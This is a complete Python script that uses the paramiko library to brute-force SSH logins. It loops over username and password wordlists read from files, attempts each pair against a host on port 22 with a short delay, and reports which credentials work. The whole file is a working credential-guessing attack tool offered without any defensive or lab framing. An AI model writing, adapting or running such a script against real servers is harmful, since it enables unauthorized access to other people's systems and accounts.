import paramiko
import socket
import time
def brute_force_ssh(hostname,port,user,password):
    log=paramiko.util.log_to_file('log.log')
    ssh_client=paramiko.SSHClient()
    ssh_client.load_system_host_keys()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        print('Testing Credentials {}:{}'.format(user,password))
        ssh_client.connect(hostname,port=port,username=user,password=password,timeout=5)
        print('credentials ok {}:{}'.format(user,password))
    except paramiko.AuthenticationException as e1:
        print("Authentication exception : ",e1)  
    except socket.error as e2:
        print('socket error',e2)
def main():
    hostname=''
    port=22
    users=open('users2.txt','r')
    users=users.readlines()
    passwords=open('passwords2.txt','r')
    passwords=passwords.readlines()
    for user in users:
        for password in passwords:
            time.sleep(3)
            brute_force_ssh(hostname,port,user.rstrip(),password.rstrip())
if __name__=='__main__':
    main()
            